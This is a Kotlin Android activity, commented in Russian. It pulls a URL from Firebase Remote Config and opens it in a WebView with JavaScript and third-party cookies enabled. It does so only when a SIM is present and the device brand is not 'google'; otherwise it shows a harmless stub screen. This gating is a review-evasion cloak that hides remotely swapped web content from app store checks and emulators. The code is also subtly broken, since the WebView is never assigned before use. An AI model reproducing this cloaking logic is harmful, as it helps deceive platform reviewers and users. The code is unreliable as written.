package com.kostlin.fragment

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Bundle

import android.telephony.TelephonyManager
import android.view.View
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings

class WebActivity : AppCompatActivity() {

    private var webView: WebView? = null

    private var _prefManager: SharedPreferencesManager? = null
    private val prefManager: SharedPreferencesManager
        get() = _prefManager!!

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        webView?.restoreState(savedInstanceState)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_web)

        _prefManager = SharedPreferencesManager(this)
        checkFirebaseUrl()
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        webView?.saveState(outState)
    }

    override fun onStop() {
        CookieManager.getInstance().flush()
        super.onStop()
    }

    override fun onDestroy() {
        _prefManager = null
        webView = null
        super.onDestroy()
    }

    private fun startStub(){
        startActivity(Intent(this,MainActivity::class.java))
        finish()
    }

    private fun checkFirebaseUrl() {
        //Получаем ссылку их локального хранилища
        val savedUrl = prefManager.getURL()
        //Если ссылка пустая, то обращаемя к FirebaseRemote
        if (savedUrl.isEmpty()) {
            //Настраиваем конфиг FirebaseRemote
            val remoteConfig = Firebase.remoteConfig.apply {
                setConfigSettingsAsync(remoteConfigSettings {
                    fetchTimeoutInSeconds = 60
                })
            }
            //Ставим слушатель на получение ссылки из FirebaseRemote
            remoteConfig.fetchAndActivate().addOnSuccessListener {
                //Здесь мы получили ссылку по уникальному тегу
                //Тег должен быть одинаковым в проекте и в Firebase
                val webUrl = remoteConfig.getString(FIREBASE_URL_TAG)
                //Проверяем если значение не пустое, то есть пришла реальная ссылка
                if (webUrl.isNotEmpty()) {
                    //Сохраняем ссылку в локальное хранилище
                    prefManager.putURL(webUrl)
                    //Запускаем WebView
                    setWebView(webUrl)
                } else startStub()
            }
        } else {
            //Срабатывает если ссылка уже сохранена локально,
            //чтобы не делать повторные запросы в FirebaseRemote

            //Запускаем WebView
            setWebView(savedUrl)
        }
    }

    private fun setWebView(loadingUrl: String) {
        //Делаем проверку
        // 1) Вставлена ли сим-карта
        // 2) Реальное ли устройство (сравнивает бренд телефона, если "google" - false
        // 3) Проверяет соединение с интернетом
        if (isSIMInserted() && isRealDevice() && isNetworkAvailable()) {
            //Настраиваем WebView
           // webView = findViewById(R.id.web_browser)
            webView!!.apply {
                CookieManager.getInstance().setAcceptThirdPartyCookies(this, true);
                settings.apply {
                    domStorageEnabled = true
                    javaScriptEnabled = true
                    useWideViewPort = true
                    databaseEnabled = true
                    javaScriptCanOpenWindowsAutomatically = true

                    cacheMode = WebSettings.LOAD_DEFAULT
                }
                webViewClient = object : WebViewClient() {

                    override fun onPageFinished(view: WebView?, url: String?) {
                        super.onPageFinished(view, url)

                        // --- COOKIE ----
                        CookieManager.getInstance().setAcceptThirdPartyCookies(view, true)
                        if (Uri.parse(loadingUrl).host == "" || Uri.parse(url).host == "") {
                            return
                        }
                        //Если был редирект делает webView видимым(логика как и раньше)
                        if (
                            (Uri.parse(loadingUrl).host != Uri.parse(url).host) ||
                            (Uri.parse(loadingUrl).query != Uri.parse(url).query)
                        ) {
                            webView?.visibility = View.VISIBLE
                        }
                    }

                    override fun onReceivedError(
                        view: WebView?,
                        request: WebResourceRequest?,
                        error: WebResourceError?
                    ) {
                        view?.stopLoading()
                        startStub()
                    }

                    override fun onLoadResource(view: WebView?, url: String?) {
                        super.onLoadResource(view, url)
                        CookieManager.getInstance().setAcceptThirdPartyCookies(view, true);
                    }
                }
            }
            //Запускаем загрузку WebView
            webView!!.loadUrl(loadingUrl)
        } else startStub()
    }

    private fun isSIMInserted(): Boolean {
        return TelephonyManager.SIM_STATE_ABSENT != (this.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState
    }

    private fun isRealDevice(): Boolean {
        if (Build.BRAND.lowercase().equals("google")) return false
        return true
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            this.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
                    ?: return false
            return when {
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                else -> false
            }
        } else {
            if (connectivityManager.activeNetworkInfo != null && connectivityManager.activeNetworkInfo!!.isConnectedOrConnecting) {
                return true
            }
        }
        return false
    }

    override fun onBackPressed() {
        if (webView?.visibility == View.VISIBLE) {
            webView?.goBack()
        } else {
            super.onBackPressed()
        }
    }

    companion object {
        const val FIREBASE_URL_TAG = "FireBaseLink"
    }

}